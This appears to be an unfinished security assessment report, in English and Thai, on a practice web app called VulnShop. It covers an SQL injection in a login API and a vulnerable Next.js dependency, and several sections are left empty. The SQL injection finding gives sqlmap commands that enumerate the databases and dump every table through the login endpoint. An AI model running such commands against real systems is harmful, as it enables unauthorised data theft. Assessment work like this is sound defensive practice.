# _VulnShop Security Assessment Report_

# 1. Vulnerability Summary (สรุปช่องโหว่)

# 2. Detailed Findings (รายละเอียดทางเทคนิค)

## VULN-01: SQL Injection

- **Severity:** **CRITICAL**
- **Location:**
- **reference:**

### Discovery (การค้นพบ)

1. ใช้ burp Suite เพื่อดัก request เพื่อดูโครงสร้างข้อมูลของ request
2. ใช้ sqlmap ทดสอบ sql injection
   **Audit Log:**

```bash
sqlmap -u "http://localhost:8888/api/login" --data='{"username":"test","password":"*"}' --header="Content-Type: application/json" --ignore-code=401,400
# ผลลัพธ์: ยืนยันการมีช่องโหว่ และ database ที่ใช้คือ PostgreSQL

sqlmap -u "http://localhost:8888/api/login" --data='{"username":"test","password":"*"}' --header="Content-Type: application/json" --dbs
# ผลลัพธ์:  พบ 3 DB คือ information_schema, pg_catalog, public

sqlmap -u "http://localhost:8888/api/login" --data='{"username":"test","password":"*"}' --header="Content-Type: application/json" --D public --dump
# ผลลัพธ์: สามารถดึงข้อมูลทุกตารางจาก public
```

**Steps to Reproduce:**

ไม่มี

### Root Cause Analysis (สาเหตุ)

-

### Remediation (วิธีการแก้)

- **Vulnerable Code:**

ไม่มี

## VULN-02: Remote Code Execution (RCE) in Next.js

- **Severity:** **CRITICAL** (CVSS v3.1: 9.8)

- **Location:** package.json

- **reference:** GHSA-9qr9-h5gf-34mp

### Discovery (การค้นพบ)

run Security Pipeline ใน GitHub Action โดยใช้คำสั่ง npm audit

**Audit Log:**

```bash

next  15.5.1-canary.0  -  15.5.6

Severity:  critical

Next.js  is  vulnerable  to  RCE  in  React  flight  protocol  -[https://github.com/advisories/GHSA-9qr9-h5gf-34mp](https://github.com/advisories/GHSA-9qr9-h5gf-34mp)

fix  available  via  `npm audit fix --force`

Will  install  next@15.5.7,  which  is  outside  the  stated  dependency  range

node_modules/next

```

**Steps to Reproduce:**

ไม่มี

### Root Cause Analysis (สาเหตุ)

โปรเจกต์มีการเรียกใช้ `Next.js` เวอร์ชัน `15.5.1-canary.0` ซึ่งเป็นเวอร์ชันที่มีช่องโหว่ RCE อนุญาตให้ผู้โจมตีรันคำสั่งอันตรายบน Server ได้

### Remediation (วิธีการแก้)

ทำการอัปเดต Package เป็นเวอร์ชัน `15.5.7` ตามคำแนะนำของ Security Advisory

**Vulnerable Code:**

ไม่มี
